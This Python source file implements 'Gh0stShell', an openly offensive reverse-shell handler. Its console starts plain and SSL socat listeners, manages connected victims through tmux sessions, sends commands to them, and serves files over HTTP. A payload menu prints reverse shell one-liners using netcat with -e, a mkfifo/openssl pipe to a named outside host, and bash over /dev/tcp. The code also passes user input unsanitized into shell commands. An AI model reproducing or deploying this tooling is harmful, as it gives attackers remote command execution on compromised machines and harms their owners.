# Gh0stShell



from cmd import Cmd
import os

def banner():
    print("")
    print("   .aMMMMP     dMP dMP    .aMMMb    .dMMMb  dMMMMMMP    .dMMMb     dMP dMP     dMMMMMP     dMP     dMP ")
    print("  dMP         dMP dMP    dMP dMP   dMP  VP    dMP      dMP  VP    dMP dMP     dMP         dMP     dMP ") 
    print(" dMP MMP     dMMMMMP    dMP dMP    VMMMb     dMP       VMMMb     dMMMMMP     dMMMP       dMP     dMP  ") 
    print("dMP.dMP     dMP dMP    dMP.aMP   dP .dMP    dMP      dP .dMP    dMP dMP     dMP         dMP     dMP   ") 
    print("VMMMP      dMP dMP     VMMMP     VMMMP     dMP       VMMMP     dMP dMP     dMMMMMP     dMMMMMP dMMMMMP")
    print("")
 
class MyPrompt(Cmd):
    prompt = 'Gh0stShell> '
    intro = "\nWelcome to Gh0stShell! (www.ghostshell.de)\nType ? for Help\n"

    def do_sessions(self, inp):
        print("List sessions...")
        print("Use: strg+b d to detach session; if failed no clients are connected or the server is not started or both")
        os.system('tmux ls')

    def do_join(self, inp):
        print("Join session...")
        os.system("tmux attach-session -t " + inp)

    def do_cmd(self, inp):
        print("Execute shell command...")
        os.system(inp)

    def do_create_ssl_cert(self, inp):
        print("Create SSL Certificate...")
        os.system("openssl req -newkey rsa:2048 -nodes -keyout server.key -x509 -days 30 -out server.crt")
        os.system("cat server.key server.crt > server.pem")

#tmux send-keys -t 0 hostname C-m
#send_command 0 "ping 8.8.8.8"
#2all: for _pane in $(tmux list-panes -a -F '#{pane_id}'); do echo $_pane; done
    def do_send_command(self, inp):
        print("Execute shell command client...")
        os.system("tmux send-keys -t " + inp + " C-m")

    def do_info(self, inp):
        print("Informations...")
        print("")
        print("Hostname")
        os.system("hostname")
        print("")
        print("IP-Infos")
        os.system("ip a s | grep inet")
        print("")
        print("Netstat-Socat")
        os.system("netstat -antep | grep socat")

    def do_ping(self, inp):
        print("Ping host...")
        os.system("ping " + inp)

#pushd ./share/; python -m SimpleHTTPServer 8000; popd
    def do_start_webshare(self, inp):
        print("Run Webshare...")
        os.system("cd ./share/; python -m SimpleHTTPServer " + inp)

#socat OPENSSL-LISTEN:8443,cert=server.pem,reuseaddr,verify=0,fork EXEC:./socatscript.sh
    def do_start_multihandler(self, inp):
        print("Run listener...")
        os.system('socat TCP-LISTEN:' + inp +',reuseaddr,fork EXEC:./socatscript.sh &')

    def do_start_multihandler_ssl(self, inp):
        print("Run listener...")
        os.system('socat OPENSSL-LISTEN:' + inp +',cert=server.pem,reuseaddr,verify=0,fork EXEC:./socatscript.sh &')

    def do_stop_multihandler(self, inp):
        print("Stop listener...")
        #os.system("pid=$(ps ax | grep socat | grep TCP-LISTEN | cut -d ' ' -f1);kill $pid")
        os.system("killall socat")

    def do_show_payloads(self, inp):
        print("Show payloads...")
        print("")
        print("REVERSE SHELLS")
        print("--------------")
        print("NETCAT (Windows): nc <ip> <port> -e cmd.exe")
        print("NETCAT (LINUX): nc <ip> <port> -e /bin/bash") 
        print("OS (LINUX): mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect wslab.de:8443 > /tmp/s; rm /tmp/s") 
        print("OS (OSX): bash -i >& /dev/tcp/<ip>/<port> 0>&1") 
        print("")

    def do_exit(self, inp):
        print("Bye")
        return True
    
    def help_exit(self):
        print('exit the application. Shorthand: x q Ctrl-D.')

    def help_show_payloads(self):
        print('Show payload to connect to the Gh0stShell')

    def help_info(self):
        print('Show informations')

    def help_cmd(self):
        print('Execute shell command')

    def help_send_command(self):
        print('Execute shell command on client')
        print('Example: send_command 0 "ping 8.8.8.8"')

    def help_ping(self):
        print("Ping host")

    def help_start_webshare(self):
        print("Run a Webshare")
        print("Example: start_webshare <port>")

    def help_create_ssl_cert(self):
        print("Create an SSL certificate for the SSL multihandler")
 
    def help_sessions(self):
        print("List running sessions / connected clients; Use: strg+b d to detach session")

    def help_join(self):
        print("Join running sessions / connected clients; Use: strg+b d to detach session")

    def help_start_multihandler(self):
        print("Run multihandler sockets for incoming connections")
        print("you can set the port or it will use a random port")
        print("Example: start_multihandler 443")

    def help_start_multihandler_ssl(self):
        print("Run SSL multihandler sockets for incoming connections")
        print("you can set the port or it will use a random port")
        print("Example: start_multihandler 443")

    def help_stop_multihandler(self):
        print("Stop multihandler sockets for incoming connections")
 
    def default(self, inp):
        if inp == 'x' or inp == 'q':
            return self.do_exit(inp)
 
        print("Unknown command: {}".format(inp))
 
    do_exit = do_exit
    help_exit = help_exit
 
if __name__ == '__main__':
    banner()
    MyPrompt().cmdloop()
